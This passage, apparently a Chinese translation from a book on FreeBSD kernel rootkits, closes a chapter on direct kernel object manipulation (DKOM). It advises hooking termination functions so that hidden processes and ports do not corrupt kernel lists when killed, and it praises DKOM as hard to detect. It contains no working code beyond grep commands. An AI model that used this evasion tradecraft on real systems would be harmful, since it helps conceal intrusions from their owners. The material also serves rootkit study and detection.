^([2]) ² 当一个 TCP 连接执行主动关闭并发送最终的 ACK 时，连接将被置于 2MSL 等待状态，这是最大段生命期的两倍。这允许 TCP 连接在第一个 ACK 丢失的情况下重新发送最终的 ACK。

# 污染内核数据

在我总结这一章之前，让我们考虑以下问题：当你的一个隐藏对象被发现并被消灭时会发生什么？

在最佳情况下，什么都不会发生。在最坏的情况下，内核会崩溃，因为当一个对象被杀死时，内核会无条件地将其从其各种列表中移除。然而，在这种情况下，对象已经被移除。因此，内核将无法找到它，并会在其列表的末尾越界，在这个过程中破坏那些数据结构。

为了防止这种数据损坏，这里有一些建议：

+   将终止函数（们）挂钩以防止它们移除您的隐藏对象。

+   在终止之前，将终止函数（们）挂钩以将您的隐藏对象放回列表中。

+   实现您自己的“退出”函数以安全地杀死您的隐藏对象。

+   什么也不做。如果您的隐藏对象从未被发现，它们永远不会被杀死——对吗？

# 结论

DKOM 是最难检测的 rootkit 技术之一。通过修补内核用于账簿和报告所依赖的对象，您可以在留下极小痕迹的同时产生期望的结果。例如，在本章中，我已经展示了如何通过一些简单的修改来隐藏一个正在运行的过程和一个打开的端口。

虽然 DKOM 确实有有限的使用（因为它只能操作主内存中的对象），但内核中有许多对象可以修补。例如，要获取所有内核队列数据结构的完整列表，请执行以下命令：

```
`$ cd /usr/src/sys`
$ `grep -r "LIST_HEAD(" *`
. . .
$ `grep -r "TAILQ _HEAD(" *`
. . .

```
